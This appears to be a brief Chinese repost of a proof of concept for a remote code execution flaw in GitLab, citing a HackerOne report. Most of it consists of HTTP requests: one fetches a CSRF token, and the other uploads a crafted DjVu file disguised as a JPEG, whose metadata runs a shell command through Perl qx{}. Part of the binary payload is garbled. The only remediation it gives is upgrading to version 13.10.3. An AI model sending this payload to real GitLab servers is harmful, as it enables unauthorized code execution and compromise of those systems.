> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MO8WfQibwBW6hnh609iPjA)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV34on7YdeialCxJ84FLDLBo5gHYnrgVoC0vicY4gQGbfDicMbYUjKbHcVb6wDpYicHK3GtlAIefdxIHDw/640?wx_fmt=png)

参考：  

https://hackerone.com/reports/1154542

获取 X-CSRF-Token

```
GET /users/sign_in
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV34on7YdeialCxJ84FLDLBo5yJ0d74Qib1JbzVGNI6uA32dpjYHwInZ48jMxyickw8OX3BX0E2Ab6icBg/640?wx_fmt=png)

RCE  

```
POST /uploads/user
Host: \{\{Hostname\}\}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
X-CSRF-Token: \{\{csrf-token\}\}
Content-Disposition: form-data; 
Content-Type: image/jpeg

AT&TFORM  疍JVMDIRM   .?    F   ?蘅?!葢N?亿堣k鍰,q領觧暯⒚"?FORM   ^DJVUINFO   
   d  INCL   shared_anno.iff BG44    J  婃岜7?*? BG44   鶡BG44   
FORM  DJVIANTa  P(metadata
  (Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

修复建议：

GitLab 版本 13.10.3 已修复更新